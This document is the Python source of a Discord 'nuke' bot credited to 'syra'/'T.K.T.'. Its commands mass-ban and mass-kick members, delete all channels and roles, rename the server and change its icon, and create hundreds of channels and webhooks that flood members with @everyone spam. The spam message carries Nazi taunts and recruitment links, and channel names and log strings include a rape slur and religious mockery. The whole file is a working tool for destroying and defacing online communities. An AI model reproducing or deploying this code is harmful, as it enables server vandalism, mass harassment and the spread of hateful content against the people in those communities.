import discord
from discord.ext import commands
import random
import aiohttp
import asyncio
import base64
import math

intents = discord.Intents.all()

prefix = "$"

token = ""

bot=commands.Bot(command_prefix=prefix, intents=intents, help_message=None)

@bot.command()
async def cmds(ctx):
    await ctx.send(f"""
```lag
                   
                   Prefix = {prefix}

[========================================]
{prefix}funny - Nukes the server
{prefix}cr - Creates Roles
{prefix}dr - Deletes roles
{prefix}dc - Deletes channels
{prefix}cc - Creates Channels
{prefix}wb - Spam creates webhooks
{prefix}cn - Changes server name
{prefix}ci - Changes server image
{prefix}wf - Floods webhooks in server
{prefix}mb - Massbans every member
{prefix}mk - Masskicks every member
[========================================]
```
-# Created by syra
""")

@bot.event
async def on_ready():
    print(f"""Logged into {bot.user}""")
    
headers = {
    "Authorization": f"Bot {token}",
    "Content-Type": "Application/json"
}

base = "https://discord.com/api/v10"

@bot.command()
async def mk(ctx):
    await ctx.send("Starting mass kick...")

    async with aiohttp.ClientSession(headers=headers) as session:

        async def kick(member):
            # Safety checks
            if member.bot:
                return False
            if member == ctx.guild.owner:
                return False
            if member.top_role >= ctx.guild.me.top_role:
                return False

            url = f"{base}/guilds/{ctx.guild.id}/members/{member.id}"

            try:
                async with session.delete(url) as resp:
                    if resp.status in (200, 204):
                        print(f"[−] Kicked {member}")
                        return True
                    elif resp.status == 429:
                        retry = (await resp.json()).get("retry_after", 2)
                        await asyncio.sleep(retry)
                        return await kick(member)
            except Exception as e:
                print(f"[!] Kick error {member}: {e}")
            return False

        results = await asyncio.gather(*(kick(m) for m in ctx.guild.members))

    await ctx.send(f"Kick complete. Kicked: {sum(results)}")

@bot.command()
async def mb(ctx):
    await ctx.send("Starting mass ban...")

    async with aiohttp.ClientSession(headers=headers) as session:

        async def ban(member):
            if member.bot:
                return False
            if member == ctx.guild.owner:
                return False
            if member.top_role >= ctx.guild.me.top_role:
                return False

            url = f"{base}/guilds/{ctx.guild.id}/bans/{member.id}"
            payload = {"reason": "Mass ban command"}

            try:
                async with session.put(url, json=payload) as resp:
                    if resp.status in (200, 201, 204):
                        print(f"[−] Banned {member}")
                        return True
                    elif resp.status == 429:
                        retry = (await resp.json()).get("retry_after", 2)
                        await asyncio.sleep(retry)
                        return await ban(member)
            except Exception as e:
                print(f"[!] Ban error {member}: {e}")
            return False

        results = await asyncio.gather(*(ban(m) for m in ctx.guild.members))

    await ctx.send(f"Ban complete. Banned: {sum(results)}")

@bot.command()
async def dc(ctx):
    print("[+] Starting to delete all channels.")

    async with aiohttp.ClientSession(headers=headers) as session:
        tasks = []

        for channel in ctx.guild.channels:
            tasks.append(delete_channel_raw(session, channel))

        res = await asyncio.gather(*tasks)

        deleted = sum(1 for r in res if r)
        failed = len(res) - deleted
    print(f"[+] Deleted {deleted}, failed {failed}")

async def delete_channel_raw(session, channel):
    url = f"{base}/channels/{channel.id}"
    try:
        async with session.delete(url) as response:
            if response.status == 200 or response.status == 204:
                print(f"[+] Deleted channel: {channel.name}")
                return True
            else:
                error_text = await response.text()
                print(f"""Failed to delete channel: {channel.name} | {response.status} {error_text}""")
    except Exception as e:
        print(f"[!] Exception in deleting {channel.name}: {e}")
        return False
    
@bot.command()
async def cc(ctx, amount: int = 25):
    print("[+] Creating channels.")
    tasks = []
    async with aiohttp.ClientSession(headers=headers) as session:
        for i in range(amount):
            cname = "raped by tkt"
            tasks.append(create_channel_raw(session,ctx.guild.id,cname))

        res = await asyncio.gather(*tasks)
        created = sum(1 for r in res if r)
        failed = len(res) - created

        print(f"Channels created: {created}, failed: {failed}")

async def create_channel_raw(session,guild_id,name):
    url = f"{base}/guilds/{guild_id}/channels"
    payload = {
        "name": name,
        "type": 0
    }
    try:
        async with session.post(url, json=payload) as resp:
            if resp.status in (200,204):
                print(f"[+] Created {name}")
                return True
            else:
                error = await resp.text()
                print(f"[!] Failed to create: {resp.status}, {error}")
                return False
    except Exception as e:
        print(f"[!] Exception in creation: {e}")
        return False

@bot.command()
async def ci(ctx, filename: str = "XD.png"):
    try:
        # Read the image file from disk and encode it
        with open(filename, "rb") as image_file:
            image_bytes = image_file.read()
            encoded_icon = base64.b64encode(image_bytes).decode("utf-8")

        # Build the payload
        payload = {
            "icon": f"data:image/png;base64,{encoded_icon}"
        }

        # Send PATCH request to update server icon
        url = f"{base}/guilds/{ctx.guild.id}"
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.patch(url, json=payload) as resp:
                if resp.status in (200, 204):
                    print("Server icon changed")
                else:
                    error = await resp.text()
                    print(f"Failed: {resp.status}, {error}")
                    print(f"[!] API Error: {error}")

    except FileNotFoundError:
        print(f"File not found: `{filename}`")
    except Exception as e:
        print(f"Exception occurred: {e}")
        print(f"[!] Exception: {e}")

nukedname = "xd"

@bot.command()
async def cn(ctx):
    url = f"{base}/guilds/{ctx.guild.id}"
    payload = {
        "name": nukedname
    }
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.patch(url, json=payload) as resp:
            if resp.status == (200, 204):
                print(f"Changed name to {nukedname}")

@bot.command()
async def wb(ctx):
    async with aiohttp.ClientSession(headers=headers) as session:
        tasks = []

        for channel in ctx.guild.text_channels:
            tasks.append(create_webhook(session, channel, f"okurr"))

        results = await asyncio.gather(*tasks)

        success = sum(1 for r in results if r)
        fail = len(results) - success

    print(f"Created {success} webhooks. Failed in {fail} channels.")

async def create_webhook(session, channel, name):
    url = f"{base}/channels/{channel.id}/webhooks"
    payload = {
        "name": name,
        "avatar": None
    }

    try:
        async with session.post(url, json=payload) as resp:
            if resp.status in (200, 201):
                print(f"[+] Webhook created in {channel.name}")
                return True
            else:
                err = await resp.text()
                print(f"[!] Failed in {channel.name}: {resp.status} {err}")
                return False
    except Exception as e:
        print(f"[!] Exception in {channel.name}: {e}")
        return False
    
total = 200
message = """
||@everyone||<>||@here||
# NUKED BY T.K.T.
# WHAT IF HITLER WON?
# NUKED BY T.K.T.
# WHAT IF HITLER WON?
https://media.discordapp.net/attachments/1546316614843240493/1546769715282841620/ec74ef0ccef85df4409f3de1aecfcaaf.png?ex=6aa0fd0d&is=6a9fab8d&hm=5285055c637e2920f40d39705bfea038200469adf998f1537ca831bc9d07c8e1&=&format=webp&quality=lossless
https://t.me/+BtQRGUE7ZZVmMjY0
https://discord.gg/gqZdYPwdC8
"""

@bot.command()
async def wf(ctx):
    print(f"Fetching webhooks in server `{ctx.guild.name}`...")
    url = f"{base}/guilds/{ctx.guild.id}/webhooks"
    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                print("Failed to fetch webhooks.")
                return
            webhook_data = await resp.json()

    webhook_urls = [hook["url"] for hook in webhook_data if hook.get("url")]

    if not webhook_urls:
        print("No webhooks found in this server.")
        return

    print(f"Starting spam. Total: `{total}` across `{len(webhook_urls)}` webhooks.")

    per_webhook = math.ceil(total / len(webhook_urls))
    tasks = []
    for webhook_url in webhook_urls:
        tasks.append(send_messages_through_webhook(webhook_url, per_webhook, message))

    results = await asyncio.gather(*tasks)

    total_sent = sum(results)
    print(f"Messages sent successfully: **{total_sent}**")

async def send_messages_through_webhook(webhook_url, count, message):
    sent = 0
    async with aiohttp.ClientSession() as session:
        while sent < count:
            try:
                payload = {
                    "content": message
                }
                async with session.post(webhook_url, json=payload) as resp:
                    if resp.status in (200, 204):
                        sent += 1
                    elif resp.status == 429:
                        print(f"[!] Rate Limited, Retrying.")
                    else:
                        print(f"[!] Webhook send failed: {resp.status}")
            except Exception as e:
                print(f"[!] Exception sending webhook: {e}")

    print(f"[+] Done: {sent} messages sent to webhook")
    return sent

@bot.command()
async def cr(ctx, amount: int = 50):
    print(f"Creating {amount} roles...")

    tasks = []
    async with aiohttp.ClientSession(headers=headers) as session:
        for i in range(amount):
            name = f"Syracuse"
            tasks.append(create_role_api(session, ctx.guild.id, name))

        results = await asyncio.gather(*tasks)
        success = sum(1 for r in results if r)
        fail = len(results) - success

    print(f"Roles created: {success}, Failed: {fail}")

async def create_role_api(session, guild_id, name):
    url = f"{base}/guilds/{guild_id}/roles"
    payload = {
        "name": name,
        "permissions": "0",
        "mentionable": True,
        "hoist": False
    }
    try:
        async with session.post(url, json=payload) as resp:
            if resp.status in (200, 201):
                print(f"[+] Created role: {name}")
                return True
            else:
                error = await resp.text()
                print(f"[!] Failed to create role: {resp.status} | {error}")
                return False
    except Exception as e:
        print(f"[!] Exception creating role: {e}")
        return False
    
@bot.command()
async def dr(ctx):
    print("Deleting all deletable roles...")

    tasks = []
    async with aiohttp.ClientSession(headers=headers) as session:
        for role in ctx.guild.roles:
            if role.is_default() or role.managed or role.position >= ctx.guild.me.top_role.position:
                continue
            tasks.append(delete_role_api(session, ctx.guild.id, role.id, role.name))

        results = await asyncio.gather(*tasks)
        deleted = sum(1 for r in results if r)
        failed = len(results) - deleted

    print(f"Deleted: {deleted} roles. Failed: {failed}")

async def delete_role_api(session, guild_id, role_id, name):
    url = f"{base}/guilds/{guild_id}/roles/{role_id}"
    try:
        async with session.delete(url) as resp:
            if resp.status in (200, 204):
                print(f"[+] Deleted role: {name}")
                return True
            else:
                error = await resp.text()
                print(f"[!] Failed to delete role {name}: {resp.status} | {error}")
                return False
    except Exception as e:
        print(f"[!] Exception deleting role {name}: {e}")
        return False

@bot.command()
async def funny(ctx, amount = 1000, message = """
||@everyone||<>||@here||
# NUKED BY T.K.T.
# WHAT IF HITLER WON?
# NUKED BY T.K.T.
# WHAT IF HITLER WON?
https://media.discordapp.net/attachments/1546316614843240493/1546769715282841620/ec74ef0ccef85df4409f3de1aecfcaaf.png?ex=6aa0fd0d&is=6a9fab8d&hm=5285055c637e2920f40d39705bfea038200469adf998f1537ca831bc9d07c8e1&=&format=webp&quality=lossless
https://t.me/+BtQRGUE7ZZVmMjY0
https://discord.gg/gqZdYPwdC8
""", iconfile = "XD.png", new_name = "𓊈T.K.T.𓊉"):
    print(f"Starting nuke")

    guild_id = ctx.guild.id
    session = aiohttp.ClientSession(headers=headers)

    print("💣 beginning allahu ackbar 💣💣💣")

    await delete_all_roles(session, ctx.guild)
    await delete_all_channels(session, ctx.guild)

    print("server wiped, moving on.")

    # create channels
    print("Creating text channels...")
    channel_tasks = [create_channel(session, guild_id, f"「TKT」𓊈T.K.T.𓊉「TKT」") for i in range(200)]
    created_channels = await asyncio.gather(*channel_tasks)
    created_channels = [ch for ch in created_channels if ch]

    # make roles
    print("creating roles")
    role_tasks = [create_role(session, guild_id, f"「TKT」") for i in range(50)]
    await asyncio.gather(*role_tasks)

    # create webhooks
    print("creating webhooks")
    webhook_tasks = [create_webhook(session, ch["id"], f"「ꜱʏʀᴀ」") for ch in created_channels]
    webhook_urls = await asyncio.gather(*webhook_tasks)
    webhook_urls = [url for url in webhook_urls if url]

    # icon
    print("Updating server icon")
    await update_icon(session, guild_id, iconfile)

    # serv name
    print(f"Changing server name to: {new_name}")
    await change_name(session, guild_id, new_name)

    # webhook spam
    print("spamming webhooks")
    msg_tasks = [send_webhook_messages(url, math.ceil(amount / len(webhook_urls)), message) for url in webhook_urls]
    await asyncio.gather(*msg_tasks)

    await session.close()
    print("nuked")

# ---------- COMPONENT FUNCTIONS ----------

async def delete_all_channels(session, guild):
    channels = [ch for ch in guild.channels]

    async def delete_channel(ch):
        try:
            url = f"{base}/channels/{ch.id}"
            async with session.delete(url) as resp:
                if resp.status in (200, 204):
                    print(f"[−] Deleted channel: {ch.name}")
                    return True
                elif resp.status == 429:
                    retry = await resp.json()
                    retry_after = retry.get("retry_after", 2)
                    print(f"[!] Rate limited for {retry_after}s on {ch.name}")
                    await asyncio.sleep(retry_after)
                    return await delete_channel(ch)  # retry
                else:
                    print(f"[!] Failed: {ch.name} ({resp.status})")
                    return False
        except Exception as e:
            print(f"[!] Exception deleting {ch.name}: {e}")
            return False

    await asyncio.gather(*[delete_channel(ch) for ch in channels])


async def delete_all_roles(session, guild):
    for role in guild.roles:
        if role.is_default() or role.managed or role.position >= guild.me.top_role.position:
            continue
        try:
            url = f"{base}/guilds/{guild.id}/roles/{role.id}"
            async with session.delete(url) as resp:
                if resp.status in (200, 204):
                    print(f"[−] Deleted role: {role.name}")
                else:
                    print(f"[!] Failed to delete role {role.name}: {resp.status}")
        except Exception as e:
            print(f"[!] Exception deleting role {role.name}: {e}")


async def create_channel(session, guild_id, name):
    url = f"{base}/guilds/{guild_id}/channels"
    payload = {"name": name, "type": 0}
    try:
        async with session.post(url, json=payload) as resp:
            if resp.status in (200, 201):
                data = await resp.json()
                print(f"[+] Created channel: {name}")
                return data
    except Exception as e:
        print(f"[!] Channel error: {e}")

async def create_role(session, guild_id, name):
    url = f"{base}/guilds/{guild_id}/roles"
    payload = {"name": name, "permissions": "0", "mentionable": True}
    try:
        async with session.post(url, json=payload) as resp:
            if resp.status in (200, 201):
                print(f"[+] Created role: {name}")
                return True
    except Exception as e:
        print(f"[!] Role error: {e}")

async def create_webhook(session, channel_id, name):
    url = f"{base}/channels/{channel_id}/webhooks"
    payload = {"name": name}
    try:
        async with session.post(url, json=payload) as resp:
            if resp.status in (200, 201):
                data = await resp.json()
                print(f"[+] Created webhook in channel {channel_id}")
                return data["url"]
    except Exception as e:
        print(f"[!] Webhook error: {e}")

async def update_icon(session, guild_id, file):
    try:
        with open(file, "rb") as f:
            img = base64.b64encode(f.read()).decode("utf-8")
        payload = {"icon": f"data:image/png;base64,{img}"}
        async with session.patch(f"{base}/guilds/{guild_id}", json=payload) as resp:
            if resp.status in (200, 204):
                print("[+] Icon updated")
            else:
                print(f"[!] Icon error: {resp.status}")
    except Exception as e:
        print(f"[!] Icon file error: {e}")

async def change_name(session, guild_id, name):
    payload = {"name": name}
    async with session.patch(f"{base}/guilds/{guild_id}", json=payload) as resp:
        if resp.status in (200, 204):
            print(f"[+] Name updated to {name}")
        else:
            print(f"[!] Name change error: {resp.status}")

async def send_webhook_messages(url, count, content):
    sent = 0
    async with aiohttp.ClientSession() as session:
        while sent < count:
            async with session.post(url, json={"content": content}) as resp:
                if resp.status in (200, 204):
                    sent += 1
                elif resp.status == 429:
                    print("Ratelimited, trying again.")



bot.run(token)
